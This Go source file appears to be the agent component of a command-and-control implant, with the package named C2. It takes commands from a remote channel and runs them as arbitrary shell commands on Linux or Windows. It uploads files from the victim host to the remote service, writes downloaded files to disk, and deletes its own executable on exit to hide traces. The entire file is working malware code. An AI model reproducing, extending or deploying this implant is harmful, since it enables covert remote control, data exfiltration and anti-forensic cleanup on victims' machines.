package C2

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	InputCol  string
	OutputCol string
	Row       int
	Input     string
	Output    string
}

func (cmd *Command) Execute(c2 Client) {

	// TODO download
	if strings.HasPrefix(cmd.Input, "download") {
		cmd.downloadFile(c2)
		return
	}

	// TODO upload
	if strings.HasPrefix(cmd.Input, "upload") {
		cmd.uploadFile(c2)
		return
	}

	// TODO exit
	if cmd.Input == "exit" {
		path, _ := os.Executable()
		os.Remove(path)
		os.Exit(0)
	}

	// else
	cmd.executeCmd()

}

func (cmd *Command) executeCmd() {

	var args []string
	var cmdToExec string = cmd.Input
	var output []byte
	var err error

	splitArgs := strings.Split(cmdToExec, " ")
	if runtime.GOOS != "windows" {
		if len(splitArgs) > 1 {
			args = splitArgs[1:]
			cmdToExec = splitArgs[0]
		}
		output, err = exec.Command(cmdToExec, args...).Output()
	} else {
		args = append(args, "/c")
		args = append(args, splitArgs...)
		output, err = exec.Command("cmd", args...).Output()
	}

	if err != nil {
		cmd.Output = err.Error()
	} else {
		cmd.Output = string(output)
	}
}

func (cmd *Command) uploadFile(c2 Client) {
	cmd_split := strings.Split(cmd.Input, ";")
	if len(cmd_split) == 2 {
		upload_path := cmd_split[1]
		fmt.Println("Upload file: " + upload_path)
		// Client.LogDebug("Upload file: " + upload_path)

		file, err := os.Open(upload_path)
		if err != nil {
			fmt.Println("Failed to open")
			log.Fatal(err)
		}
		defer file.Close()
		bf, _ := io.ReadAll(file)

		req, err := c2.newRequest("PUT", "../../../root:/"+upload_path+":/content", bytes.NewBuffer(bf), "text/plain")
		if err != nil {
			fmt.Println("Failed to create request")
			log.Fatal(err)
		}

		_, err = c2.do_noparse(req)
		if err != nil {
			fmt.Println("Failed http")
			cmd.Output = err.Error()
		}
		cmd.Output = "File written"
	}
}

func (cmd *Command) downloadFile(c2 Client) {
	cmd_split := strings.Split(cmd.Input, ";")
	if len(cmd_split) == 3 {
		remote_file := cmd_split[1]
		local_file := cmd_split[2]
		fmt.Println("Download file - " + remote_file + " to " + local_file)

		req, err := c2.newRequest("GET", "../../../root:/"+remote_file+":/content", nil, "text/plain")
		if err != nil {
			log.Fatal(err)
		}

		resp_body, err := c2.do_noparse(req)
		if err != nil {
			cmd.Output = err.Error()
		}

		fl, err := os.Create(local_file)
		if err != nil {
			cmd.Output = err.Error()
		}

		_, err = fl.Write(resp_body)
		if err != nil {
			cmd.Output = err.Error()
		} else {
			cmd.Output = fl.Name() + " written"
		}
	}
}
